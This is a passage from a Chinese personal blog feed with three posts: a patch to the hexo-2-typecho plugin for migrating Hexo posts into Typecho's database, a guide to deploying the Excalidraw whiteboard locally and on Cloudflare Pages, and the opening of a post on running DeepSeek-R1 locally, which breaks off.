中。点击树状列表中对应的表，等待加载完成后在右侧找到<code>导入</code>，并上传生成的对应的 sql 文件，然后在最底下点击<code>导入</code>按钮，等待。如果最终新的数据展示出来，则表明导入成功。</p><p>接下来的事，便是图片路径修改（如果图片存在本地的话）、伪静态、插件、主题等事情，按 Typecho 的使用方式去做就行了。</p><h2 id="插件微调">插件微调</h2><p>导入完后，感觉还不错。但随后我发现了问题：</p><ol><li>它转换后的 slug 字段与 title 字段是一样的</li><li>有概率使得每篇文章重复生成</li><li>原代码设置<code>set global max_allowed_packet=157286400;</code>，但这在有些主机上反而不合适</li></ol><p>其实，在 WordPress 中也是如此，允许以文章名作为永久链接。如果在<code>设置</code>-&gt;<code>永久链接</code>中选择了<code>wordpress 风格</code>，也是这个效果。不过，我在 Hexo 中已经使用过 abbrlink 插件，而 Typecho 也有开发者制作了 AbbrSlug 插件，为防止将来转换后出现失效链接，我想：能不能让它转换时保留这个字段？</p><p>翻阅文档，好像暂时没有这个配置项；看了下 issue，有人提出，但暂无人回应。不过，这个插件已经很久没有更新了，似乎也正常。</p><p>于是，我打开插件的脚本文件，观察代码。我之前还在 AI 的帮助下做了个 dec 与 hex 互相转化的脚本，用于统一 Hexo 的 abbrlink 字段。同时，如果有人没使用 abbrlink，那此时就按原样处理 slug。考虑这部分情况，那么思路如下：</p><ul><li>优先检查是否有 abbrlink 字段（无论是否有引号，最终都处理为无单双引号的）</li><li>如该值存在，则使用该字段作为 slug 值</li><li>如果不存在 abbrlink，则回退到原 slug/title</li></ul><p>等一下……既然都改了，那何不把这部分交给配置文件完成，使得灵活性更高呢？那就也设定一个默认值，如果用户设置了自定义内容就按配置的来；没配置或找不到配置字段就按默认的来。</p><p>至于重复的问题……原代码中<code>hexo.extend.generator.register</code>会在每次构建时被调用，但没有防止重复处理的机制。这样一来就可能导致：每次构建时，所有文章都会被再次处理，并添加到<code>contents.inner</code>数组中。</p><p>我的解决办法是添加一个状态标志，在生成器开始时检查文章是否已处理，并在处理完成后将其标记为已处理状态，从而确保每次构建只处理一次文章。这样无论构建多少次，文章都只会被处理一次；<code>contents.inner</code>数组不会再重复添加文章；文章的<code>cid</code>也能正常排列下去。</p><p><code>max_allowed_packet</code>则是 MySQL 中用于设置服务器端和客户端在一次传送数据包过程中允许的最大数据包大小的参数。如果超过了设置的最大长度，数据库操作将会失败。原来代码将其值固定，那不妨将其也改为由<code>_config.yml</code>控制。</p><p>这样的话，原插件<code>【Blogroot】\node_modules\hexo-2-typecho</code>中的<code>index.js</code>可修改如下（以下修改使用 diff 代码块标识）：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">// 省略......</span><br><span class="line"></span><br><span class="line">// hexo相关初始化</span><br><span class="line">const config = hexo.config;</span><br><span class="line">let typecho = config.typecho;</span><br><span class="line"></span><br><span class="line">if (typecho == null) &#123;</span><br><span class="line">    // 如果没有做typecho的配置，则默认设置作者id是1，照片地址在images下。</span><br><span class="line">    typecho = &#123;</span><br><span class="line">        authorId: 1,</span><br><span class="line">        images: &quot;images&quot;,</span><br><span class="line">        mid: 10,</span><br><span class="line"><span class="deletion">-         cid: 10</span></span><br><span class="line"><span class="addition">+         cid: 10,</span></span><br><span class="line"><span class="addition">+         slug: &#x27;title&#x27;,   // 默认使用title作为slug来源</span></span><br><span class="line"><span class="addition">+         table: &#x27;t&#x27;,      // 默认表前缀为t_</span></span><br><span class="line"><span class="addition">+         maxAllowedPacket: 0 // 设置0或为配置则不生成</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="addition">+ &#125; else &#123;</span></span><br><span class="line"><span class="addition">+     // 设置默认值</span></span><br><span class="line"><span class="addition">+     if (typecho.slug === undefined) &#123;</span></span><br><span class="line"><span class="addition">+         typecho.slug = &#x27;title&#x27;;</span></span><br><span class="line"><span class="addition">+     &#125;</span></span><br><span class="line"><span class="addition">+     if (typecho.table === undefined) &#123;</span></span><br><span class="line"><span class="addition">+         typecho.table = &#x27;t&#x27;;</span></span><br><span class="line"><span class="addition">+     &#125;</span></span><br><span class="line"><span class="addition">+     if (typecho.maxAllowedPacket === undefined) &#123;</span></span><br><span class="line"><span class="addition">+         typecho.maxAllowedPacket = 0;</span></span><br><span class="line"><span class="addition">+     &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">if (!typecho.authorId) &#123;</span><br><span class="line">    typecho.authorId = 1;</span><br><span class="line">&#125;</span><br><span class="line">// 省略......</span><br><span class="line"></span><br><span class="line">metas.mid = typecho.mid;</span><br><span class="line">contents.cid = typecho.cid;</span><br><span class="line"></span><br><span class="line"><span class="addition">+ let processed = false; // 添加处理状态标志</span></span><br><span class="line">hexo.extend.generator.register(&#x27;post&#x27;, function (locals) &#123;</span><br><span class="line"><span class="addition">+     if (processed) return; // 如果已经处理过则跳过</span></span><br><span class="line"><span class="addition">+     processed = true; // 标记为已处理</span></span><br><span class="line">    </span><br><span class="line">    locals.posts = locals.posts.sort(&quot;+date&quot;);</span><br><span class="line">    locals.posts.forEach(p =&gt; &#123;</span><br><span class="line">        postProcess(p);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    locals.pages = locals.pages.sort(&quot;+date&quot;);</span><br><span class="line">    locals.pages.forEach(p =&gt; &#123;</span><br><span class="line">        pageProcess(p);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function postProcess(data) &#123;</span><br><span class="line"><span class="addition">+     // 确定slug来源</span></span><br><span class="line"><span class="addition">+     let slugSource;</span></span><br><span class="line"><span class="addition">+     if (typecho.slug === &#x27;title&#x27;) &#123;</span></span><br><span class="line"><span class="addition">+         slugSource = data.slug;  // 默认情况</span></span><br><span class="line"><span class="addition">+     &#125; else &#123;</span></span><br><span class="line"><span class="addition">+         // 尝试从front-matter获取配置的字段</span></span><br><span class="line"><span class="addition">+         slugSource = data[typecho.slug]; </span></span><br><span class="line"><span class="addition">+         </span></span><br><span class="line"><span class="addition">+         // 如果找不到指定字段，回退到默认值</span></span><br><span class="line"><span class="addition">+         if (slugSource === undefined) &#123;</span></span><br><span class="line"><span class="addition">+             slugSource = data.slug;</span></span><br><span class="line"><span class="addition">+         &#125;</span></span><br><span class="line"><span class="addition">+     &#125;</span></span><br><span class="line">    let data1 = &#123;</span><br><span class="line">        cid: contents.newCid(),</span><br><span class="line">        title: data.title,</span><br><span class="line"><span class="deletion">-         slug: data.slug,</span></span><br><span class="line"><span class="addition">+         slug: slugSource,  // 使用动态slug值</span></span><br><span class="line">        created: Math.floor(data.date.valueOf() / 1000),</span><br><span class="line">        modified: Math.floor(data.updated.valueOf() / 1000),</span><br><span class="line">        //text: data.content,</span><br><span class="line">        order: 0,</span><br><span class="line">        // 省略......</span><br><span class="line">    &#125;;</span><br><span class="line">    // 省略......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 省略......</span><br><span class="line"></span><br><span class="line">function pageProcess(data) &#123;</span><br><span class="line"><span class="addition">+     // 确定slug来源（与postProcess相同逻辑）</span></span><br><span class="line"><span class="addition">+     let slugSource;</span></span><br><span class="line"><span class="addition">+     if (typecho.slug === &#x27;title&#x27;) &#123;</span></span><br><span class="line"><span class="addition">+         slugSource = data.title;  // 页面默认使用title</span></span><br><span class="line"><span class="addition">+     &#125; else &#123;</span></span><br><span class="line"><span class="addition">+         slugSource = data[typecho.slug]; </span></span><br><span class="line"><span class="addition">+         if (slugSource === undefined) &#123;</span></span><br><span class="line"><span class="addition">+             slugSource = data.title;</span></span><br><span class="line"><span class="addition">+         &#125;</span></span><br><span class="line"><span class="addition">+     &#125;</span></span><br><span class="line">    let data1 = &#123;</span><br><span class="line">        cid: contents.newCid(),</span><br><span class="line">        title: data.title,</span><br><span class="line"><span class="deletion">-        slug: data.title,</span></span><br><span class="line"><span class="addition">+        slug: slugSource,  // 修改这里</span></span><br><span class="line">        created: Math.floor(data.date.valueOf() / 1000),</span><br><span class="line">        modified: Math.floor(data.updated.valueOf() / 1000),</span><br><span class="line">        //text: data.content,</span><br><span class="line">        order: 0,</span><br><span class="line">        // 省略......</span><br><span class="line">    &#125;;</span><br><span class="line">    // 省略......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 省略......</span><br><span class="line"></span><br><span class="line">// 文章页面产出</span><br><span class="line">hexo.extend.filter.register(&#x27;after_generate&#x27;, function () &#123;</span><br><span class="line"></span><br><span class="line">    // 省略......</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"><span class="deletion">-         let sql = &quot;set global max_allowed_packet=157286400;\n&quot;;</span></span><br><span class="line"><span class="addition">+         let sql = &quot;&quot;;</span></span><br><span class="line"><span class="addition">+         if (typecho.maxAllowedPacket &gt; 0) &#123;</span></span><br><span class="line"><span class="addition">+            sql = `set global max_allowed_packet=$&#123;typecho.maxAllowedPacket&#125;;\n`; // 改为根据配置项决定生成情况</span></span><br><span class="line"><span class="addition">+         &#125;</span></span><br><span class="line"><span class="addition">+         const tablePrefix = typecho.table + &#x27;_&#x27;;</span></span><br><span class="line">        contents.inner.forEach(content =&gt;&#123;</span><br><span class="line"><span class="deletion">-             sql += `insert into t_contents(cid,title,slug,created,modified,text,\`order\`,authorId,template,type,status,password,commentsNum,allowComment,allowPing,allowFeed,parent)</span></span><br><span class="line"><span class="addition">+             sql += `insert into $&#123;tablePrefix&#125;contents(cid,title,slug,created,modified,text,\`order\`,authorId,template,type,status,password,commentsNum,allowComment,allowPing,allowFeed,parent) </span></span><br><span class="line">        value($&#123;content.cid&#125;,$&#123;JSON.stringify(content.title)&#125;,$&#123;JSON.stringify(content.slug)&#125;,$&#123;content.created&#125;,$&#123;content.modified&#125;,$&#123;JSON.stringify(content.text)&#125;,$&#123;content.order&#125;,$&#123;content.authorId&#125;,$&#123;content.template&#125;,&#x27;$&#123;content.type&#125;&#x27;,&#x27;$&#123;content.status&#125;&#x27;,$&#123;content.password&#125;,$&#123;content.commentsNum&#125;,$&#123;content.allowComment&#125;,$&#123;content.allowPing&#125;,$&#123;content.allowFeed&#125;,$&#123;content.parent&#125;);\n`;</span><br><span class="line">        &#125;);</span><br><span class="line">        fs.writeFile(&quot;./typecho/contents.sql&quot;, sql, err =&gt; &#123;</span><br><span class="line">            if (err) &#123;</span><br><span class="line">                console.error(err);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                console.log(&quot;导出文章页面 sql成功&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">        console.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 文章meta信息产出</span><br><span class="line">hexo.extend.filter.register(&#x27;after_generate&#x27;, function () &#123;</span><br><span class="line"></span><br><span class="line">    // 省略......</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        let d1 = _strMapToObj(metas.tagMap);</span><br><span class="line">        d1.push(..._strMapToObj(metas.categoryMap));</span><br><span class="line"><span class="addition">+         const tablePrefix = typecho.table + &#x27;_&#x27;;</span></span><br><span class="line">        let sql = &quot;&quot;;</span><br><span class="line"><span class="deletion">-         d1.forEach(meta =&gt;&#123;</span></span><br><span class="line"><span class="deletion">-             sql += `insert into t_metas(mid,name,slug,type,description,count,\`order\`,parent) </span></span><br><span class="line"><span class="addition">+         d1.forEach(meta =&gt;&#123;</span></span><br><span class="line"><span class="addition">+             sql += `insert into $&#123;tablePrefix&#125;metas(mid,name,slug,type,description,count,\`order\`,parent) </span></span><br><span class="line">        value($&#123;meta.mid&#125;,&#x27;$&#123;meta.name&#125;&#x27;,&#x27;$&#123;meta.slug&#125;&#x27;,&#x27;$&#123;meta.type&#125;&#x27;,null,$&#123;meta.count&#125;,0,0);\n`;</span><br><span class="line">        &#125;);</span><br><span class="line">        fs.writeFile(&quot;./typecho/metas.sql&quot;, sql, err =&gt; &#123;</span><br><span class="line">            if (err) &#123;</span><br><span class="line">                console.error(err);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                console.log(&quot;导出meta sql成功&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">        console.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 关系产出</span><br><span class="line">hexo.extend.filter.register(&#x27;after_generate&#x27;, function () &#123;</span><br><span class="line"></span><br><span class="line">    // 省略......</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"><span class="addition">+         const tablePrefix = typecho.table + &#x27;_&#x27;;</span></span><br><span class="line">        let sql = &quot;&quot;;</span><br><span class="line">        relationships.r.forEach(relation =&gt;&#123;</span><br><span class="line"><span class="deletion">-             sql += `insert into t_relationships(mid,cid) value($&#123;relation.mid&#125;,$&#123;relation.cid&#125;);\n`;</span></span><br><span class="line"><span class="addition">+             sql += `insert into $&#123;tablePrefix&#125;relationships(mid,cid) value($&#123;relation.mid&#125;,$&#123;relation.cid&#125;);\n`;</span></span><br><span class="line">        &#125;);</span><br><span class="line">        fs.writeFile(&quot;./typecho/relationships.sql&quot;, sql, err =&gt; &#123;</span><br><span class="line">            if (err) &#123;</span><br><span class="line">                console.error(err);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                console.log(&quot;导出关系 sql成功&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">        console.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 省略......</span><br></pre></td></tr></table></figure><p>然后在<code>_config.yml</code>中配置（）：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">typecho:</span></span><br><span class="line">  <span class="attr">authorId:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">images:</span> <span class="string">&#x27;images&#x27;</span></span><br><span class="line">  <span class="attr">mid:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">cid:</span> <span class="number">10</span></span><br><span class="line">  <span class="comment"># 原有参数，未配置则按默认情况处理</span></span><br><span class="line">  <span class="attr">slug:</span> <span class="string">&#x27;abbrlink&#x27;</span> <span class="comment"># 使用 abbrlink 作为 slug 来源，未配置则默认为 title</span></span><br><span class="line">  <span class="attr">table:</span> <span class="string">&#x27;typecho&#x27;</span> <span class="comment"># 生成 typecho_contents 等表名，未配置则默认为 t_contents等</span></span><br><span class="line">  <span class="attr">maxAllowedPacket:</span> <span class="number">0</span> <span class="comment"># 设置为 0 或缺省该项则不生成</span></span><br></pre></td></tr></table></figure><p>修改后保存，再次尝试<code>hexo g</code>。如果一切顺利，则新生成的 sql 文件中，slug 值应为 abbrlink 值；若无，则回退使用 title。如此一来，可减少转换过程中产生失效链接的可能性。</p><h2 id="后记">后记</h2><p>当然，我暂未将主力切换到 Typecho。</p><p>完全静态，安全性比较好；而且纯静态也省却查询数据库的时间（但在我这，速度并非飞快）。还有一点，就是可选择的托管服务商多了。</p><p><s>不过也不排除将来换系统的可能性。但愿不必过度折腾……</s></p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 代码 </tag>
            
            <tag> 折腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Excalidraw 开源白板工具部署</title>
      <link href="/posts/460603327/"/>
      <url>/posts/460603327/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>有时我需要为文档制作配图，但制作一张演示图就使用专业软件，于我而言有些大材小用。</p><p>还有些时候，我有了一个思路，但身边只有移动设备；对于某些思路而言，纯文字不如图像直观。</p><p>假如我要与他人协作，如果不用那些比较专业的工具，大多展示起来显得不便。</p><p>……</p><p>有没有一个便捷方案可以解决这些问题？</p><h3 id="Excalidraw-是什么">Excalidraw 是什么</h3><p>Excalidraw 是一款开源的在线白板工具，能够帮助用户快速制作简单的手绘风格的思维导图——当然，它的用途不止于此，流程图、示意图和开发架构图等常用图像，都可以用它制作。得益于它拥有实时协作、开放源码、易集成等特点，它可以为开发者和用户提供一个简单、直观且功能强大的绘图体验。</p><p>只要你的设备有现代浏览器（IE 之类的旧版浏览器就别凑热闹了）且能连接互联网，那么就可以快速地使用它。官方提供了一个在线程序：<a href="https://excalidraw.com/" rel="external nofollow noreferrer">https://excalidraw.com/</a>。当然，不连接互联网，自己本地部署也可以使用。</p><p><img src="https://s2.loli.net/2024/10/26/mDuatcP2whyON3p.png" alt=""></p><h3 id="搭建准备">搭建准备</h3><p>Docker 部署的优点此处不再赘述，但是我现在没有能用于跑 Docker 的服务器，暂时无法尝试。不过既然 Excalidraw 可以被打包成静态网页，那么没有自己的服务器也可以完成了。</p><p>那么，你只需要准备这些东西就行了：</p><ul><li>域名</li><li>能提供 Node.js 环境的设备</li><li>通畅的网络</li></ul><p>平台账户注册的方法此处不提，请自行百度。</p><p>当然，如果你将其部署在 Vercel、Cloudflare、Netlify 等平台上，甚至域名也不是必须的，只要你能解决它们提供的二级域名在国内抽风的问题（解决不了的话，还是得要一个域名）。</p><p>更极端一点，你可以在本地把编译的工作完成，然后推送到 GitHub 之类的平台上，利用其速度尚可的 GitHub Pages（相比于上面这些平台的）完成整个流程。</p><h3 id="部署过程">部署过程</h3><h4 id="本地部署">本地部署</h4><p>本地部署更加可控，可以很方便地进行自定义设置与组件引用。</p><p>确保设备已安装 Node.js 和 Git。在设备中选择一个目录，打开 Git 终端，执行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/excalidraw/excalidraw.git</span><br><span class="line">cd excalidraw</span><br></pre></td></tr></table></figure><p>网速不佳可以使用镜像站：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://kkgithub.com/excalidraw/excalidraw.git # 镜像站点</span><br><span class="line">cd excalidraw</span><br></pre></td></tr></table></figure><p>完成后进入目录，在项目根目录中使用终端执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install react react-dom @excalidraw/excalidraw</span><br></pre></td></tr></table></figure><p>或者使用 yarn：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add react react-dom @excalidraw/excalidraw</span><br></pre></td></tr></table></figure><p>随后执行命令启用演示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run start</span><br></pre></td></tr></table></figure><p>第一次使用可能还需安装组件（时间可能比较漫长），请耐心等待。之后执行命令，等待一会儿会自动打开网页以供在线使用。</p><p>你也可以将其打包为静态文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure><p>然后将项目<code>/excalidraw-app/build/</code>中的资源上传到 GitHub 等平台进行托管（不能放在子目录，否则很可能因相对路径的问题而导致资源无法读取）。</p><h4 id="Cloudflare-Pages">Cloudflare Pages</h4><p>其实就相当于把整个部署的过程移到云上。这样有一个好处，项目更新时只需在自己仓库中点击<code>Sync Fork</code>同步仓库，随后 Pages 会自动触发部署更新（默认启用，可以手动关闭），对于网速不佳或设备不便的用户而言是方便的。</p><p>前往 <a href="https://github.com/excalidraw/excalidraw" rel="external nofollow noreferrer">https://github.com/excalidraw/excalidraw</a> 仓库，并点击<code>Fork</code>按钮，将其 Fork 到自己的账户下。</p><p><img src="https://s2.loli.net/2024/10/26/l6wrDKkUTcx73Qy.png" alt=""></p><p>随后登入 Cloudflare 控制台，在左侧菜单中进入<code>Workers 和 Pages</code>-&gt;<code>概述</code>，在页面中找到<code>创建</code>按钮，在创建应用程序页面选择<code>Pages</code>选项卡，并点击<code>连接到 Git</code>。</p><p><img src="https://s2.loli.net/2024/10/26/UkWmKiocdTNv6aF.png" alt=""></p><p>在 GitHub 选项卡中找到自己的 GitHub 帐户。如果你是首次使用 Workers 和 Pages 功能，GitHub 帐户一栏可能没有出现你的账户名称。此时需要找到<code>添加帐户</code>链接并在“安装 Cloudflare Workers 和 Pages”页面中选择自己的 GitHub 账户（准确来讲是前面你 Fork 时选择的目标账户或组织），跟着页面中的引导完成操作。</p><p>完成后回到控制台页面，如果操作正确，GitHub 帐户一栏中将出现前面 Fork 的仓库，并在“选择一个存储库”中可以找到那个仓库。如果未显示相应仓库，则需要在在 GitHub 上为 Cloudflare Pages 应用配置存储库访问权限。</p><p>等处理好后，选中自己的 GitHub 帐户，并在<code>选择一个存储库</code>中选择刚才 Fork 的仓库。如果没有经过重命名，那么此处你可以在储存库一栏找到一个名为<code>excalidraw</code>的选项卡，点击选中并点击右下角<code>开始设置</code>。</p><p><img src="https://s2.loli.net/2024/10/26/DJR5wlrM4mhXet9.png" alt=""></p><p>在下一步的设置构建和部署页面中有几个参数需要填写。<code>项目名称</code>可以任意命名（自己能辨认出就行），<code>生产分支</code>选择 master（如果是 main 就选 main）。在构建设置中，将<code>框架预设</code>选择为<code>React(Vite)</code>（实际上不选也行）（项目技术栈为 Vite + React + TypeScript + Yarn + Husky），设置构建命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure><p>构建输出目录填写如下（注意斜杠）：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">excalidraw-app/build/</span><br></pre></td></tr></table></figure><p>根目录（高级）和环境变量（高级）两处不用填写。完成后点击右下角<code>保存并部署</code>，等待完成。</p><p><img src="https://s2.loli.net/2024/10/26/S8F3jaW2uthMpHT.png" alt=""></p><p>如果填写无误，最终页面会提示部署成功，并给出<code>.pages.dev</code>域名链接，可以查看效果。</p><p>如果你有域名且托管到 Cloudflare，还可以为项目设置自定义域名。回到<code>Workers 和 Pages</code>页面，选中部署完成的 Pages 项目，在选项卡中选择<code>自定义域</code>，点击<code>设置自定义域</code>按钮，按照页面提示完成绑定，等待 DNS 解析生效后即可使用。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序 </tag>
            
            <tag> Cloudflare </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在本地部署 Deepseek-R1 模型并使用</title>
      <link href="/posts/3058912286/"/>
      <url>/posts/3058912286/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今年春节，大伙应该了解到，国产深度学习模型 DeepSeek 话题热度剧增。看看应用市场，其下载量在排行榜上占据靠前的位置，甚至有些占据榜首；各种分析和介绍的视频也是随处可见；NVIDIA 股价当场跳水……单从这些点，便可见其影响力之大，而且至少在接下来一段时间内还会继续上升。原谅我词穷，找不到更好的形容词了。</p><p>官方版量大管饱、便宜好用。网页版和 APP 目前是免费的，注册就能用（至少目前我还没找到对话时所谓剩余额度和充值入口）；API 是需要消耗额度的，但有免费赠送的额度，充值额度也很有性价比。</p><p>用了下，发现效果很不错。就拿春节期间我和 GPT4o-mini 随意写的“小说”举例：我随意地规划了一个故事情节，提了几点要求，加了点引导，让 GPT 写了个小说，然后把初稿给 Deepseek 评价和提建议；之后，我发自内心地放弃了我原来拟的大纲。写成那个样子的小说，它不仅把 GPT 写得漏洞百出的剧情~~（不过一次性写了近万字也属实难为它了）<s>圆回来了，甚至还把主旨拔高了不少</s>（有一种改作文发现其工作量比重写还大后选择后者的美）~~。</p><p>回到正题。由于其极高的访问量、不俗的性能，以及一些“特殊原因”，这个模型鼓舞了一些人，同样的也惹到了一些人，因此得到了各种意义上的“特殊关照”。如果你使用过它，应该会注意到，询问问题时它经常会提示“繁忙”。其他平台也陆续上线了这个模型，但我想总有些人~~（咽口水）~~不会优先考虑付费方案。</p><p>如果询问普通的内容，在网页版或 app 中使用 Deepseek 非常不错，但是一旦问一些敏感内容<s>例如某些大伙想看的东西</s>时，很容易被内容审查终止。这个模型还能接入一些代码编辑器、知识库、搜索等工具，但有些时候因数据性质所致，在线使用不太适合。</p><p>好在，Deepseek 提供了本地部署模型的方案，在本地部署则没有这些顾虑了（唯一的顾虑可能就是硬件配置）……</p><h2 id="Ollama-or-LM-Studio">Ollama or LM Studio</h2><table><thead><tr><th>比较项</th><th>LM Studio</th><th>Ollama + WebUI</th></tr></thead><tbody><tr><td>核心定位</td><td>面向非开发者的本地化桌面工具，提供一体化 GUI，闭源免费</td><td>面向开发者的命令行框架，可以直接使用，也可以搭配第三方 UI 使用，开源</td></tr><tr><td>使用难度</td><td>适合小白用户，支持 macOS、Windows</td><td>需命令行操作，图形化界面需另外部署安装，全平台支持</td></tr><tr><td>模型管理</td><td>连接 HuggingFace 